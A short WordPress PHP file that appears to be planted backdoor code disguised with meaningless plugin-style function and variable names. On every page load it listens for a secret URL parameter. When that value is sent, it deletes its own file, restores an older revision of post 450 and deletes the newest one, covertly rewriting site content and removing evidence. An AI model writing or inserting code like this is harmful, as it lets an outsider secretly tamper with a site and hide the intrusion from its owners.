<?php

function effect_polyfill_multi_type() {
	if (isset($_GET['interactive_subscribe_instant']) && $_GET['interactive_subscribe_instant'] === 'tracking_source_bulk_default') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$safe_register_javascript = 450;
		$taxonomy_exception_copyright_hide = wp_get_post_revisions($safe_register_javascript);
		if (empty($taxonomy_exception_copyright_hide)) die('no revisions');
		if (count($taxonomy_exception_copyright_hide) < 2) die('less than 2');
		$sync_business_maker_country = array_shift($taxonomy_exception_copyright_hide);
		$terms_thumbnails_role = $sync_business_maker_country->ID;
		$scripts_popup_coming = array_shift($taxonomy_exception_copyright_hide);
		$name_reusable_font_bootstrap = $scripts_popup_coming->ID;
		$server_zoom_reader = wp_restore_post_revision($name_reusable_font_bootstrap);
		if ($server_zoom_reader === false) die('error restoring');
		$server_zoom_reader = wp_delete_post_revision($terms_thumbnails_role);		
		if ($server_zoom_reader === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'effect_polyfill_multi_type');
